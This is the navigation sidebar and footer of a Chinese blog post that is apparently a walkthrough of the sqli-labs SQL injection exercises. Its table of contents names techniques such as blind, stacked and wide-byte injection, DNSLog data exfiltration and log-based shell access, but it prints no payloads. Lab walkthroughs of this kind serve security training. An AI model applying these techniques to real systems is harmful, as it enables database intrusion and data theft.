class="nav-text">4.对选定表的列名进行获取</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#5-%E6%8E%A2%E6%B5%8B%E7%94%A8%E6%88%B7%E5%90%8D%E5%AF%86%E7%A0%81"><span class="nav-number">1.3.1.5.</span> <span class="nav-text">5.探测用户名密码</span></a></li></ol></li><li class="nav-item nav-level-4"><a class="nav-link" href="#POST"><span class="nav-number">1.3.2.</span> <span class="nav-text">POST</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E7%B1%BB%E5%9E%8B"><span class="nav-number">1.4.</span> <span class="nav-text">类型</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#%E8%81%94%E5%90%88%E6%B3%A8%E5%85%A5"><span class="nav-number">1.4.1.</span> <span class="nav-text">联合注入</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E6%8A%A5%E9%94%99%E6%B3%A8%E5%85%A5"><span class="nav-number">1.4.2.</span> <span class="nav-text">报错注入</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E5%A0%86%E5%8F%A0%E6%B3%A8%E5%85%A5"><span class="nav-number">1.4.3.</span> <span class="nav-text">堆叠注入</span></a><ol class="nav-child"><li class="nav-item nav-level-5"><a class="nav-link" href="#DNSLog%E6%95%B0%E6%8D%AE%E5%A4%96%E5%B8%A6"><span class="nav-number">1.4.3.1.</span> <span class="nav-text">DNSLog数据外带</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#%E5%BC%80%E5%90%AF%E6%97%A5%E5%BF%97Getshell"><span class="nav-number">1.4.3.2.</span> <span class="nav-text">开启日志Getshell</span></a></li></ol></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E4%BA%8C%E6%AC%A1%E6%B3%A8%E5%85%A5"><span class="nav-number">1.4.4.</span> <span class="nav-text">二次注入</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E7%9B%B2%E6%B3%A8"><span class="nav-number">1.4.5.</span> <span class="nav-text">盲注</span></a><ol class="nav-child"><li class="nav-item nav-level-5"><a class="nav-link" href="#%E5%B8%83%E5%B0%94%E7%9B%B2%E6%B3%A8"><span class="nav-number">1.4.5.1.</span> <span class="nav-text">布尔盲注</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#%E5%BB%B6%E6%97%B6%E7%9B%B2%E6%B3%A8"><span class="nav-number">1.4.5.2.</span> <span class="nav-text">延时盲注</span></a></li></ol></li><li class="nav-item nav-level-4"><a class="nav-link" href="#RCE-%E6%97%A0%E5%9B%9E%E6%98%BE"><span class="nav-number">1.4.6.</span> <span class="nav-text">RCE-无回显</span></a><ol class="nav-child"><li class="nav-item nav-level-5"><a class="nav-link" href="#into-outfile"><span class="nav-number">1.4.6.1.</span> <span class="nav-text">into outfile</span></a></li></ol></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E7%BB%95%E8%BF%87"><span class="nav-number">1.5.</span> <span class="nav-text">绕过</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#HTTP%E5%8F%82%E6%95%B0%E6%B1%A1%E6%9F%93"><span class="nav-number">1.6.</span> <span class="nav-text">HTTP参数污染</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#URL%E6%9E%84%E9%80%A0"><span class="nav-number">2.</span> <span class="nav-text">URL构造</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%85%B3%E4%BA%8EURL%E4%B8%AD%E7%9A%84%E7%A9%BA%E6%A0%BC"><span class="nav-number">2.1.</span> <span class="nav-text">关于URL中的空格</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%85%B3%E4%BA%8EURL%E4%B8%AD%E7%9A%84"><span class="nav-number">2.2.</span> <span class="nav-text">关于URL中的#</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA"><span class="nav-number">3.</span> <span class="nav-text">环境搭建</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%8F%82%E8%80%83"><span class="nav-number">3.1.</span> <span class="nav-text">参考</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E8%A1%A5%E5%85%85%EF%BC%9A%E6%B7%BB%E5%8A%A0MySQL%E6%97%A5%E5%BF%97"><span class="nav-number">3.2.</span> <span class="nav-text">补充：添加MySQL日志</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#lab1-%E5%8D%95%E5%BC%95%E5%8F%B7%E5%B0%81%E9%97%AD%E7%9A%84%E5%AD%97%E7%AC%A6%E5%9E%8B%E6%B3%A8%E5%85%A5"><span class="nav-number">4.</span> <span class="nav-text">lab1-单引号封闭的字符型注入</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#lab2-%E6%95%B0%E5%AD%97%E5%9E%8B%E6%B3%A8%E5%85%A5"><span class="nav-number">5.</span> <span class="nav-text">lab2-数字型注入</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#lab3-%E6%8B%AC%E5%8F%B7%E4%B8%8E%E5%8D%95%E5%BC%95%E5%8F%B7%E5%B0%81%E9%97%AD%E7%9A%84%E6%B3%A8%E5%85%A5"><span class="nav-number">6.</span> <span class="nav-text">lab3-括号与单引号封闭的注入</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#lab4-%E5%8F%8C%E5%BC%95%E5%8F%B7%E4%B8%8E%E6%8B%AC%E5%8F%B7%E5%B0%81%E9%97%AD%E7%9A%84%E5%AD%97%E7%AC%A6%E5%9E%8B%E6%B3%A8%E5%85%A5"><span class="nav-number">7.</span> <span class="nav-text">lab4-双引号与括号封闭的字符型注入</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#lab5-%E6%8A%A5%E9%94%99%E6%B3%A8%E5%85%A5"><span class="nav-number">8.</span> <span class="nav-text">lab5-报错注入</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#lab6-%E5%8F%8C%E5%BC%95%E5%8F%B7%E9%97%AD%E5%90%88%E7%9A%84%E6%8A%A5%E9%94%99%E6%B3%A8%E5%85%A5"><span class="nav-number">9.</span> <span class="nav-text">lab6-双引号闭合的报错注入</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#lab7-%E5%8D%95%E5%BC%95%E5%8F%B7%E4%B8%8E%E5%8F%8C%E6%8B%AC%E5%8F%B7%E9%97%AD%E5%90%88%E7%9A%84%E5%AD%97%E7%AC%A6%E5%9E%8B%E6%B3%A8%E5%85%A5"><span class="nav-number">10.</span> <span class="nav-text">lab7-单引号与双括号闭合的字符型注入</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#lab8-%E7%9B%B2%E6%B3%A8"><span class="nav-number">11.</span> <span class="nav-text">lab8-盲注</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%89%8B%E5%B7%A5%E6%B3%A8%E5%85%A5-1"><span class="nav-number">11.1.</span> <span class="nav-text">手工注入</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#sqlmap"><span class="nav-number">11.2.</span> <span class="nav-text">sqlmap</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#lab9-%E5%BB%B6%E8%BF%9F%E7%9B%B2%E6%B3%A8"><span class="nav-number">12.</span> <span class="nav-text">lab9-延迟盲注</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#lab10-%E5%BB%B6%E6%97%B6%E7%9B%B2%E6%B3%A8%E4%B8%8E%E5%8F%8C%E5%BC%95%E5%8F%B7"><span class="nav-number">13.</span> <span class="nav-text">lab10-延时盲注与双引号</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#lab11-post%E7%B1%BB%E5%9E%8B%E5%8D%95%E5%BC%95%E5%8F%B7%E9%97%AD%E5%90%88%E6%B3%A8%E5%85%A5"><span class="nav-number">14.</span> <span class="nav-text">lab11-post类型单引号闭合注入</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#lab12-post%E7%B1%BB%E5%9E%8B%E5%8F%8C%E5%BC%95%E5%8F%B7%E4%B8%8E%E6%8B%AC%E5%8F%B7%E9%97%AD%E5%90%88%E6%B3%A8%E5%85%A5"><span class="nav-number">15.</span> <span class="nav-text">lab12-post类型双引号与括号闭合注入</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#lab13-post%E7%B1%BB%E5%9E%8B%E5%8D%95%E5%BC%95%E5%8F%B7%E5%92%8C%E6%8B%AC%E5%8F%B7%E9%97%AD%E5%90%88%E6%B3%A8%E5%85%A5"><span class="nav-number">16.</span> <span class="nav-text">lab13-post类型单引号和括号闭合注入</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#lab14-post%E7%B1%BB%E5%9E%8B%E5%8F%8C%E5%BC%95%E5%8F%B7%E9%97%AD%E5%90%88%E6%B3%A8%E5%85%A5"><span class="nav-number">17.</span> <span class="nav-text">lab14-post类型双引号闭合注入</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#lab15-post%E7%B1%BB%E5%9E%8B%E7%9A%84%E5%B8%83%E5%B0%94%E7%9B%B2%E6%B3%A8"><span class="nav-number">18.</span> <span class="nav-text">lab15-post类型的布尔盲注</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#lab16-post%E7%B1%BB%E5%9E%8B%E7%9A%84%E6%97%B6%E9%97%B4%E7%9B%B2%E6%B3%A8"><span class="nav-number">19.</span> <span class="nav-text">lab16-post类型的时间盲注</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#lab17-post%E7%B1%BB%E5%9E%8BUPDATE-%E6%8A%A5%E9%94%99%E6%B3%A8%E5%85%A5"><span class="nav-number">20.</span> <span class="nav-text">lab17-post类型UPDATE 报错注入</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#lab18-POST%E7%B1%BB%E5%9E%8B%E7%9A%84Uagent%E5%AD%97%E6%AE%B5%E6%95%B0%E6%8D%AE%E5%A4%B4%E6%B3%A8%E5%85%A5"><span class="nav-number">21.</span> <span class="nav-text">lab18-POST类型的Uagent字段数据头注入</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#lab19-post%E7%B1%BB%E5%9E%8B%E7%9A%84Referer%E5%AD%97%E6%AE%B5%E6%95%B0%E6%8D%AE%E5%A4%B4%E6%B3%A8%E5%85%A5"><span class="nav-number">22.</span> <span class="nav-text">lab19-post类型的Referer字段数据头注入</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#lab20-post%E7%B1%BB%E5%9E%8B%E7%9A%84Cookie-Uagent%E5%AD%97%E6%AE%B5%E6%95%B0%E6%8D%AE%E5%A4%B4%E6%B3%A8%E5%85%A5"><span class="nav-number">23.</span> <span class="nav-text">lab20-post类型的Cookie-Uagent字段数据头注入</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#lab21-post%E7%B1%BB%E5%9E%8B%E7%9A%84Cookie-Uagent%E5%AD%97%E6%AE%B5base64%E7%BC%96%E7%A0%81%E6%B3%A8%E5%85%A5"><span class="nav-number">24.</span> <span class="nav-text">lab21-post类型的Cookie-Uagent字段base64编码注入</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#lab22-post%E7%B1%BB%E5%9E%8B%E7%9A%84Cookie-Uagent%E5%AD%97%E6%AE%B5base64%E7%BC%96%E7%A0%81%E6%B3%A8%E5%85%A5%EF%BC%88%E5%8F%8C%E5%BC%95%E5%8F%B7%E9%97%AD%E5%90%88%EF%BC%89"><span class="nav-number">25.</span> <span class="nav-text">lab22-post类型的Cookie-Uagent字段base64编码注入（双引号闭合）</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#lab23-GET%E7%B1%BB%E5%9E%8B%E7%9A%84%E8%BF%87%E6%BB%A4%E6%B3%A8%E9%87%8A"><span class="nav-number">26.</span> <span class="nav-text">lab23-GET类型的过滤注释</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#lab24-post%E7%B1%BB%E5%9E%8B%E4%BA%8C%E6%AC%A1%E6%8E%92%E5%BA%8F%E6%B3%A8%E5%85%A5-%E5%AD%98%E5%82%A8%E5%9E%8B%E6%B3%A8%E5%85%A5"><span class="nav-number">27.</span> <span class="nav-text">lab24-post类型二次排序注入-存储型注入</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#lab25-%E8%BF%87%E6%BB%A4and%E5%92%8Cor%EF%BC%8C%E5%8F%8C%E5%86%99%E7%BB%95%E8%BF%87"><span class="nav-number">28.</span> <span class="nav-text">lab25-过滤and和or，双写绕过</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#lab25a-%E5%9F%BA%E4%BA%8EGET%E7%9B%B2%E6%B3%A8%E6%95%B4%E5%BD%A2%E5%8D%95%E5%BC%95%E5%8F%B7"><span class="nav-number">29.</span> <span class="nav-text">lab25a-基于GET盲注整形单引号</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#lab26-%E8%BF%87%E6%BB%A4and%E5%92%8Cor%EF%BC%8C-%E5%92%8C%E2%80%93%EF%BC%8C%E6%96%9C%E6%9D%A0%E5%92%8C%E7%A9%BA%E6%A0%BC"><span class="nav-number">30.</span> <span class="nav-text">lab26-过滤and和or，#和–，斜杠和空格</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#lab26a-%E6%8B%AC%E5%8F%B7%E9%97%AD%E5%90%88%EF%BC%8C%E6%B2%A1%E6%9C%89%E6%8A%A5%E9%94%99%E4%BF%A1%E6%81%AF"><span class="nav-number">31.</span> <span class="nav-text">lab26a-括号闭合，没有报错信息</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#lab27-%E8%BF%87%E6%BB%A4%E4%BA%86union%E5%92%8Cselect"><span class="nav-number">32.</span> <span class="nav-text">lab27-过滤了union和select</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#lab27a-%E5%8F%8C%E5%BC%95%E5%8F%B7%E9%97%AD%E5%90%88"><span class="nav-number">33.</span> <span class="nav-text">lab27a-双引号闭合</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#lab28-%E5%BF%BD%E7%95%A5%E5%A4%A7%E5%B0%8F%E5%86%99"><span class="nav-number">34.</span> <span class="nav-text">lab28-忽略大小写</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#lab28a-%E5%8F%AA%E5%AF%B9union-select%E8%BF%9B%E8%A1%8C%E4%BA%86%E8%BF%87%E6%BB%A4"><span class="nav-number">35.</span> <span class="nav-text">lab28a-只对union select进行了过滤</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#lab29-HTTP%E5%8F%82%E6%95%B0%E6%B1%A1%E6%9F%93"><span class="nav-number">36.</span> <span class="nav-text">lab29-HTTP参数污染</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#lab30-%E5%8F%8C%E5%BC%95%E5%8F%B7%E9%97%AD%E5%90%88"><span class="nav-number">37.</span> <span class="nav-text">lab30-双引号闭合</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#lab31-%E5%8F%8C%E5%BC%95%E5%8F%B7%E6%8B%AC%E5%8F%B7%E9%97%AD%E5%90%88"><span class="nav-number">38.</span> <span class="nav-text">lab31-双引号括号闭合</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#lab32-%E5%AE%BD%E5%AD%97%E8%8A%82%E6%B3%A8%E5%85%A5"><span class="nav-number">39.</span> <span class="nav-text">lab32-宽字节注入</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#lab33-%E5%AE%BD%E5%AD%97%E8%8A%82%E6%B3%A8%E5%85%A5"><span class="nav-number">40.</span> <span class="nav-text">lab33-宽字节注入</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#lab34-post%E7%B1%BB%E5%9E%8B%E5%AE%BD%E5%AD%97%E8%8A%82%E6%B3%A8%E5%85%A5"><span class="nav-number">41.</span> <span class="nav-text">lab34-post类型宽字节注入</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#lab35-%E8%81%94%E5%90%88%E6%9F%A5%E8%AF%A2%E5%AE%BD%E5%AD%97%E8%8A%82%E6%B3%A8%E5%85%A5"><span class="nav-number">42.</span> <span class="nav-text">lab35-联合查询宽字节注入</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#lab36-mysql-real-escape-string%E8%BF%9B%E8%A1%8C%E8%BD%AC%E4%B9%89"><span class="nav-number">43.</span> <span class="nav-text">lab36-mysql_real_escape_string进行转义</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#lab37-post%E7%B1%BB%E5%9E%8Bmysql-real-escape-string%E5%87%BD%E6%95%B0%E8%BD%AC%E4%B9%89"><span class="nav-number">44.</span> <span class="nav-text">lab37-post类型mysql_real_escape_string函数转义</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#lab38-%E5%A0%86%E5%8F%A0%E6%B3%A8%E5%85%A5"><span class="nav-number">45.</span> <span class="nav-text">lab38-堆叠注入</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#DNSLog%E6%95%B0%E6%8D%AE%E5%A4%96%E5%B8%A6-1"><span class="nav-number">45.1.</span> <span class="nav-text">DNSLog数据外带</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%BC%80%E5%90%AF%E6%97%A5%E5%BF%97Getshell-1"><span class="nav-number">45.2.</span> <span class="nav-text">开启日志Getshell</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#lab39-%E6%95%B4%E5%BD%A2%E9%97%AD%E5%90%88%E5%A0%86%E5%8F%A0%E6%B3%A8%E5%85%A5"><span class="nav-number">46.</span> <span class="nav-text">lab39-整形闭合堆叠注入</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#lab40-%E5%8D%95%E5%BC%95%E5%8F%B7%E5%8A%A0%E6%8B%AC%E5%8F%B7%E9%97%AD%E5%90%88%E5%A0%86%E5%8F%A0%E6%B3%A8%E5%85%A5"><span class="nav-number">47.</span> <span class="nav-text">lab40-单引号加括号闭合堆叠注入</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#lab41-id%E4%B8%BA%E6%95%B4%E6%95%B0%E5%A0%86%E5%8F%A0%E6%B3%A8%E5%85%A5"><span class="nav-number">48.</span> <span class="nav-text">lab41-id为整数堆叠注入</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#lab42-post%E7%B1%BB%E5%9E%8B%E5%A0%86%E5%8F%A0%E6%B3%A8%E5%85%A5"><span class="nav-number">49.</span> <span class="nav-text">lab42-post类型堆叠注入</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#lab43-post%E7%B1%BB%E5%9E%8B%E5%A0%86%E5%8F%A0%E6%B3%A8%E5%85%A5"><span class="nav-number">50.</span> <span class="nav-text">lab43-post类型堆叠注入</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#lab44-post%E7%B1%BB%E5%9E%8B%E5%A0%86%E5%8F%A0%E6%B3%A8%E5%85%A5"><span class="nav-number">51.</span> <span class="nav-text">lab44-post类型堆叠注入</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#lab45-post%E7%B1%BB%E5%9E%8B%E5%A0%86%E5%8F%A0%E6%B3%A8%E5%85%A5"><span class="nav-number">52.</span> <span class="nav-text">lab45-post类型堆叠注入</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#lab46-order-by%E6%B3%A8%E5%85%A5"><span class="nav-number">53.</span> <span class="nav-text">lab46-order by注入</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E9%AA%8C%E8%AF%81%E6%96%B9%E5%BC%8F"><span class="nav-number">53.1.</span> <span class="nav-text">验证方式</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%8A%A5%E9%94%99%E6%B3%A8%E5%85%A5-1"><span class="nav-number">53.2.</span> <span class="nav-text">报错注入</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%B8%83%E5%B0%94%E7%9B%B2%E6%B3%A8-1"><span class="nav-number">53.3.</span> <span class="nav-text">布尔盲注</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%BB%B6%E6%97%B6%E7%9B%B2%E6%B3%A8-1"><span class="nav-number">53.4.</span> <span class="nav-text">延时盲注</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#into-outfile-1"><span class="nav-number">53.5.</span> <span class="nav-text">into outfile</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#lab47-order-by%E6%B3%A8%E5%85%A5"><span class="nav-number">54.</span> <span class="nav-text">lab47-order by注入</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#lab48-order-by%E5%BB%B6%E6%97%B6%E6%B3%A8%E5%85%A5"><span class="nav-number">55.</span> <span class="nav-text">lab48-order by延时注入</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#lab49-order-by%E5%BB%B6%E6%97%B6%E6%B3%A8%E5%85%A5"><span class="nav-number">56.</span> <span class="nav-text">lab49-order by延时注入</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#lab50-order-by%E6%B3%A8%E5%85%A5"><span class="nav-number">57.</span> <span class="nav-text">lab50-order by注入</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#lab51-%E5%8D%95%E5%BC%95%E5%8F%B7%E9%97%AD%E5%90%88order-by%E6%B3%A8%E5%85%A5-%E5%BE%85"><span class="nav-number">58.</span> <span class="nav-text">lab51-单引号闭合order by注入-待</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#lab52-order-by%E5%A0%86%E5%8F%A0%E6%B3%A8%E5%85%A5"><span class="nav-number">59.</span> <span class="nav-text">lab52-order by堆叠注入</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#lab53-%E5%8D%95%E5%BC%95%E5%8F%B7%E9%97%AD%E5%90%88%E5%A0%86%E5%8F%A0%E6%B3%A8%E5%85%A5"><span class="nav-number">60.</span> <span class="nav-text">lab53-单引号闭合堆叠注入</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#lab54-%E6%AC%A1%E6%95%B0%E9%99%90%E5%88%B6"><span class="nav-number">61.</span> <span class="nav-text">lab54-次数限制</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#lab55-%E6%8B%AC%E5%8F%B7%E9%97%AD%E5%90%88%E9%99%90%E5%AE%9A%E6%AC%A1%E6%95%B0"><span class="nav-number">62.</span> <span class="nav-text">lab55-括号闭合限定次数</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#lab56-%E5%8D%95%E5%BC%95%E5%8F%B7%E4%B8%8E%E6%8B%AC%E5%8F%B7%E9%97%AD%E5%90%88%E9%99%90%E5%AE%9A%E6%AC%A1%E6%95%B0"><span class="nav-number">63.</span> <span class="nav-text">lab56-单引号与括号闭合限定次数</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#lab57-%E5%8F%8C%E5%BC%95%E5%8F%B7%E9%97%AD%E5%90%88%E9%99%90%E5%AE%9A%E6%AC%A1%E6%95%B0"><span class="nav-number">64.</span> <span class="nav-text">lab57-双引号闭合限定次数</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#lab58-%E6%8A%A5%E9%94%99%E6%B3%A8%E5%85%A5%E9%99%90%E5%AE%9A%E6%AC%A1%E6%95%B0"><span class="nav-number">65.</span> <span class="nav-text">lab58-报错注入限定次数</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#lab59-%E6%95%B4%E5%BD%A2%E6%B3%A8%E5%85%A5%E9%99%90%E5%AE%9A%E6%AC%A1%E6%95%B0"><span class="nav-number">66.</span> <span class="nav-text">lab59-整形注入限定次数</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#lab60-%E5%8F%8C%E5%BC%95%E5%8F%B7%E6%8B%AC%E5%8F%B7%E9%97%AD%E5%90%88%E9%99%90%E5%AE%9A%E6%AC%A1%E6%95%B0"><span class="nav-number">67.</span> <span class="nav-text">lab60-双引号括号闭合限定次数</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#lab61-%E5%8D%95%E5%BC%95%E5%8F%B7%E4%B8%8E%E4%B8%A4%E4%B8%AA%E6%8B%AC%E5%8F%B7%E9%97%AD%E5%90%88%E9%99%90%E5%AE%9A%E6%AC%A1%E6%95%B0"><span class="nav-number">68.</span> <span class="nav-text">lab61-单引号与两个括号闭合限定次数</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#lab62-%E7%9B%B2%E6%B3%A8%E9%99%90%E5%AE%9A%E6%AC%A1%E6%95%B0"><span class="nav-number">69.</span> <span class="nav-text">lab62-盲注限定次数</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#lab63-%E5%8D%95%E5%BC%95%E5%8F%B7%E9%97%AD%E5%90%88%E7%9B%B2%E6%B3%A8%E9%99%90%E5%AE%9A%E6%AC%A1%E6%95%B0"><span class="nav-number">70.</span> <span class="nav-text">lab63-单引号闭合盲注限定次数</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#lab64-%E5%8F%8C%E6%8B%AC%E5%8F%B7%E9%97%AD%E5%90%88%E7%9B%B2%E6%B3%A8%E9%99%90%E5%AE%9A%E6%AC%A1%E6%95%B0"><span class="nav-number">71.</span> <span class="nav-text">lab64-双括号闭合盲注限定次数</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#lab65-%E5%8F%8C%E5%BC%95%E5%8F%B7%E4%B8%8E%E5%8F%8C%E6%8B%AC%E5%8F%B7%E9%97%AD%E5%90%88%E7%9B%B2%E6%B3%A8%E9%99%90%E5%AE%9A%E6%AC%A1%E6%95%B0"><span class="nav-number">72.</span> <span class="nav-text">lab65-双引号与双括号闭合盲注限定次数</span></a></li></ol></div>
+      </div>
+      <!--/noindex-->
+
+      <div class="site-overview-wrap sidebar-panel">
+        <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+  <p class="site-author-name" itemprop="name">wuyaxiao</p>
+  <div class="site-description" itemprop="description"></div>
+</div>
+<div class="site-state-wrap motion-element">
+  <nav class="site-state">
+      <div class="site-state-item site-state-posts">
+          <a href="/archives/">
+        
+          <span class="site-state-item-count">22</span>
+          <span class="site-state-item-name">日志</span>
+        </a>
+      </div>
+      <div class="site-state-item site-state-categories">
+            <a href="/categories/">
+          
+        <span class="site-state-item-count">7</span>
+        <span class="site-state-item-name">分类</span></a>
+      </div>
+      <div class="site-state-item site-state-tags">
+        <span class="site-state-item-count">8</span>
+        <span class="site-state-item-name">标签</span>
+      </div>
+  </nav>
+</div>
+
+
+
+      </div>
+
+    </div>
+  </aside>
+  <div id="sidebar-dimmer"></div>
+
+
+      </div>
+    </main>
+
+    <footer class="footer">
+      <div class="footer-inner">
+        
+
+        
+
+<div class="copyright">
+  
+  &copy; 
+  <span itemprop="copyrightYear">2026</span>
+  <span class="fa fa-user">
+  </span>
+  <span class="author" itemprop="copyrightHolder">wuyaxiao</span>
+</div><script color="0,0,255" opacity="0.5" zIndex="-1" count="99" src="https://cdn.jsdelivr.net/npm/canvas-nest.js@1/dist/canvas-nest.js"></script>
+
+        
+<div class="busuanzi-count">
+  <script async src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+    <span class="post-meta-item" id="busuanzi_container_site_uv" style="display: none;">
+      <span class="post-meta-item-icon">
+        <i class="fa fa-user"></i>
+      </span>
+      <span class="site-uv" title="总访客量">
+        <span id="busuanzi_value_site_uv"></span>
+      </span>
+    </span>
+    <span class="post-meta-divider">|</span>
+    <span class="post-meta-item" id="busuanzi_container_site_pv" style="display: none;">
+      <span class="post-meta-item-icon">
+        <i class="fa fa-eye"></i>
+      </span>
+      <span class="site-pv" title="总访问量">
+        <span id="busuanzi_value_site_pv"></span>
+      </span>
+    </span>
+</div>
+
+
+
+
+
+
+
+
+      </div>
+    </footer>
+  </div>
+
+  
+  <script src="/lib/anime.min.js"></script>
+  <script src="//cdn.jsdelivr.net/npm/medium-zoom@1/dist/medium-zoom.min.js"></script>
+  <script src="/lib/velocity/velocity.min.js"></script>
+  <script src="/lib/velocity/velocity.ui.min.js"></script>
+
+<script src="/js/utils.js"></script>
+
+<script src="/js/motion.js"></script>
+
+
+<script src="/js/schemes/muse.js"></script>
+
+
+<script src="/js/next-boot.js"></script>
+
+
+
+
+  
+
+
+
+
+  
+<script src="/js/local-search.js"></script>
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+  
+
+</body>
+</html>
